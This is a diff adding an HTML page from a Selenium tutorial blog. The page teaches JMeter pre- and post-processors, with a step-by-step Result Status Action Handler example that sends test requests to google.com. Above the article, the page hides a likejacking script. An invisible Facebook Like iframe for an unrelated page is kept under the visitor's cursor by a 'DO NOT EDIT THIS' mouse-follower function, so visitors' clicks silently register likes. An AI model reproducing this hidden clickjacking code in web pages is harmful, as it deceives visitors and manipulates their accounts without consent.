@@ -1,0 +1,340 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Jmeter : How to use Processor - Selenium Tutorial</title>
+    <meta name="author" content="Ta Bao Lan">
+   	
+	<meta name="description" content="Jmeter : How to use Processor" />
+	
+	<meta name="keywords" content="" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link href="/atom.xml" rel="alternate" title="Selenium Tutorial" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.ico" rel="shortcut icon">
+    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Slackey' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Amethysta' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>
+
+    <!-- remove or comment it to disable ajaxification -->   
+    <!--  <script src="/javascripts/ajaxify.js"></script> -->   
+
+
+
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    var pluginUrl =
+            '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+    _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+    _gaq.push(['_setAccount', 'UA-51278981-1']);
+    _gaq.push(['_trackPageview']);
+    function initGa() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    }
+    setTimeout(initGa, 50);
+</script>
+
+
+
+</head>
+
+<body>
+
+    <div id="wrapper">
+    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
+<h1 class="animated bounceInDown">
+    <div id="headerbg">
+		Selenium Tutorial
+		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad-banner-responsive -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5798698216356388"
+     data-ad-slot="7145934352"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+</h1>
+<br>
+
+<ul id="social-links" style="text-align:center">
+  
+  
+  <!-- Google Plus -->
+  <li>
+  <a href="http://plus.google.com/lantabao?rel=author" class="google" title="Google+"></a>
+  </li>
+  
+  
+  <!-- Facebook -->
+  <li>
+  <a href="http://www.facebook.com/gaumun" class="facebook" title="Facebook"></a>
+  </li>
+  
+  
+  
+  <!-- LinkedIn -->
+  <li>
+  <a href="http://www.linkedin.com/in/tabaolan" class="linkedin" title="LinkedIn"></a>
+  </li>
+  
+  
+  <!-- Skype -->
+  <li>
+  <a href="http://myskype.info/lantb1987" class="skype" title="Skype"></a>
+  </li>
+  
+  
+  
+</ul>
+
+
+<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
+<ul id="nav">
+	<li id="ajax"><a href="/index.html">Home</a></li>
+	<li id="ajax"><a href="/categories/webdriver/">WebDriver</a></li>
+	<li id="ajax"><a href="/categories/newbie/">Selenium Beginner</a></li>
+	<li id="ajax"><a href="/categories/testng-framework/">TestNG Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-framework/">Automation Framework</a></li>
+	<li id="ajax"><a href="/categories/icecream-framework/">IceCream Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-mobile/">Selenium Mobile</a></li>
+    <li id="ajax"><a href="/categories/tricks/">Tips&Tricks</a></li>
+	<li id="ajax"><a href="/categories/jmeter/">JMETER</a></li>
+	<li id="ajax"><a href="/categories/mobiletest/">Mobile Testing</a></li>
+	
+    <li>
+    <div id="dark">
+        <form method="get" action="/search.html" id="search">
+            <input name="query" type="text" placeholder="Search..." x-webkit-speech />
+        </form>
+    </div>
+    </li>
+        
+</ul>
+
+
+
+﻿
+</header>
+
+<div id="toload">
+<!-- begin toload -->
+<div id="content" class="inner">
+<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">
+    <iframe src="http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/pages/Trollvd/606655129460867&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>
+    <!--end facebook like frame code-->
+</div>
+<script>
+    var iflag = 0;
+    var icontainer = document.getElementById('icontainer');
+    var standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body   
+	function mouseFollower(e){ /* DO NOT EDIT THIS */ 
+	if (window.event) { icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px'; icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px'; } else { icontainer.style.top = (e.pageY-5)+'px'; icontainer.style.left = (e.pageX-5)+'px'; } } document.onmousemove = function(e) { if (iflag == 0) {mouseFollower(e);} }
+</script>
+        <article class="post">
+
+	<h2 class="title">Jmeter : How to Use Processor</h2>
+	<div class="entry-content"><h2>How to use Processor in JMeter</h2>
+
+<p>Processor is used to modify the Samplers in their scope.</p>
+
+<p>There are 2 Types of processors:</p>
+
+<p>1.Pre-processor</p>
+
+<p>2.Post-processor</p>
+
+<h3>Pre-processor</h3>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="9425076351" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<p>Pre-processor executes some action before making Sampler Request.</p>
+
+<p>onsider a simple example: let&rsquo;s say you wanted JMeter to &ldquo;spider&rdquo; through website under test, parse link(check all links on the page) and return the HTML. You would add some action such as &ldquo;HTML link parser&rdquo; to your controller before creating an HTTP request.</p>
+
+<p><img src="/images/jmeter112.png"></p>
+
+<h3>Post-processor</h3>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="7145934352" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<p>Post-processor executes some action after making a Sampler Request.</p>
+
+<p>Consider a simple example: JMeter send HTTP request to the web server under test (etc www.google.com) and get the response. You want JMeter to stop the testif the server response is error. You can use the post-processor to do above task as following:</p>
+
+<p><img src="/images/jmeter113.png"></p>
+
+<h3>Processor-Hands on</h3>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="3378542759" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<p>This tutorial will show you step-by-step instructions how to use Post-processor in JMeter. Let start with simple test script.</p>
+
+<p>1.JMeter sends HTTP request to the web server under test www.google.com.</p>
+
+<ol>
+<li><p>JMeter gets response from the Google server.</p></li>
+<li><p>If server response is error, JMeter will stop the test.</p></li>
+<li><p>If server response OK (no error), JMeter will continue the test.</p></li>
+</ol>
+
+
+<p>Here is the roadmap of this example:</p>
+
+<p><img src="/images/jmeter114.png"></p>
+
+<h4>Step 1) Add Thread Group</h4>
+
+<p>Right click on the Test Plan and add a new thread group: Add &ndash;> Threads (Users) &ndash;> Thread Group</p>
+
+<p>But in Thread Group control panel, enter Thread Properties as following:</p>
+
+<p><img src="/images/jmeter115.png"></p>
+
+<p>This setting lets JMeter create 10 user request to <a href="http://www.google.com">http://www.google.com</a>  10 times.</p>
+
+<h4>Step 2) Add JMeter elements</h4>
+
+<p>Add HTTP request default</p>
+
+<p>Add HTTP request</p>
+
+<p>We still make JMeter send request <a href="http://www.google.com">http://www.google.com</a> to Google server.</p>
+
+<h4>Step 3) Add Post-Processor Element</h4>
+
+<p>Right Click Thread Group &ndash;> Add &ndash;> Post Processor &ndash;> Result Status Action Handler</p>
+
+<p>Result Status Action Handler allows the user to stop the thread or the whole test if the user request failed.</p>
+
+<p><img src="/images/jmeter116.png"></p>
+
+<p>In Result Status Action Handle Pane, choose Stop Test Now. This selection will stop the test if JMeter get the error from server response.</p>
+
+<p><img src="/images/jmeter117.png"></p>
+
+<h4>Step 4) Configure the HTTP Request</h4>
+
+<p>Open the HTTP Request Panel. Enter &ldquo;abc&rdquo; to the Path field.</p>
+
+<p><img src="/images/jmeter118.png"></p>
+
+<p>When you enter &ldquo;abc&rdquo; to the path, JMeter will create URL request to Google server: <a href="http://www.google.com/abc.">http://www.google.com/abc.</a> This URL doesn&rsquo;t exist on Google server. It is wrong URL request so Google server will return error.</p>
+
+<h4>Step 5) Add View Result Tree</h4>
+
+<p>Right Click Thread Group  &ndash;> Add  &ndash;> Listener  &ndash;> View Result Tree</p>
+
+<p><img src="/images/jmeter119.png"></p>
+
+<h4>Step 6) Run Test</h4>
+
+<p>Select View Result Tree, press Run button on Menu bar. You will see the error response from Google server and the test will stop with out completing 100 threads.</p>
+
+<p><img src="/images/jmeter120.gif"></p>
+
+<p>Now return to step 4, open the HTTP Request pane, enter &ldquo;calendar&rdquo; to the pane. It makes JMeter create URL request <a href="http://www.google.com/calendar">http://www.google.com/calendar</a> to the Google server. This is correct URL request so Google server will return OK (no error).</p>
+
+<p><img src="/images/jmeter121.png"></p>
+
+<p>Select View Result Tree, press Run button on Menu bar. You will see the OK response from Google server and the test will continue until all 100 threads are complete.</p>
+
+<p><img src="/images/jmeter122.gif"></p>
+</div>
+
+<div class="meta">
+	
+		<span class="comments"><a href="/jmeter-how-to-use-processor/#disqus_thread">Comments</a></span>
+	
+</div>
+
+<br>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+ </div>
+    <footer id="footer">
+    <div style="display:inline">
+    Copyright &copy; 2014
+
+    Ta Bao Lan
+. Powered by <a href="http://octopress.org">Octopress</a>
+</div>
+
+
+    </footer>
+    <script src="/javascripts/fabric.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'tabaolan1987';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.tabaolan.com/jmeter-how-to-use-processor/';
+        var disqus_url = 'http://www.tabaolan.com/jmeter-how-to-use-processor/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+<!-- end toload --> 
+</div>
+</div>
+<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
+<script type="text/javascript">
+/*<![CDATA[*/
+;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
+/*]]>*/
+</script><!-- remove it to remove the scroll to top button -->
+</body>
+</html>
